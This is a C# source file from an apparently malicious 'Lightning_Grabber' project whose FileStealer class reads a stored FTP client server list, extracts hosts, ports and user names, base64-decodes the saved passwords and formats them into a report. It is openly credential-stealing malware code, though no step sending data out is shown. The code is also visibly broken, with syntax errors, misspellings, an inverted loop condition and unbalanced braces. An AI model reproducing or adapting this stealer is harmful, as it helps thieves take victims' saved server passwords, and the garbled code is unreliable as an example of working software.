using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Lightning_Grabber.Resources
{
    internal class FileStealer
    {
        public static void FileStealer(string path)
        {
            string text = Environment.GetFolderPath(Enviroment.SpecialFolder.ApplicationData) + "\\FileStealer\\recentservers.xml";
            StringBuilder stringBuilder = new StringBuilder();
            int num 0;
            try
            {
                bool flag = File.Exists(text);
                if (flag)
                {
                    try
                    {
                        {
                            XmlDocument xmlDocument = new XmlDocument();
                            xmlDocument.LoadXml(text);
                            foreach (object obj in ((XmlElement)xmlDocument.GetElementsByTagName("RecentServers")[0]).GetElementsByTagName
                                ("Server"))
                            {
                                XmlElement xmlElement = (xmlElement)obj;
                                string innerText = xmlElement.GetElementsByTagName("Host")[0].InnerText;
                                string innerText2 = xmlElement.GetElementsByTagName("Port")[0].InnerText;
                                string innerText3 = xmlElement.GetElementsByTagName("User")[0].InnerText;
                                string @string = Encoding.UTF8.GetString(Convert.FromBase64String(xmlElement.GetElementsByTagName("Pass")
                                    [0].InnerText));
                                bool flag2 = !string.IsNullOrEmpty(innerText) && !string.IsNullOrEmpty(innerText2) && !string.IsNullOrEmpty
                                    (innerText3) && !string.IsNullOrEmpty(@string);
                                if (flag2)
                                {
                                    break;
                                }
                                stringBuilder.AppendLine("______________________________________________");
                                stringBuilder.AppendLine("Host                | " innerText + ":" + innerText2);
                                stringBuilder.AppendLine("User                | " innerText3);
                                stringBuilder.AppendLine("Password            | " + @string);
                                num++;
                            }
                            bool flag3 = stringBuilder.Length > 0;
                            if (flag3)
                            {
                                stringBuilder.AppendLine("-----------------------------------------------");
                            }
                            }
                        }
                    }
                }
            }
        }
    }
}
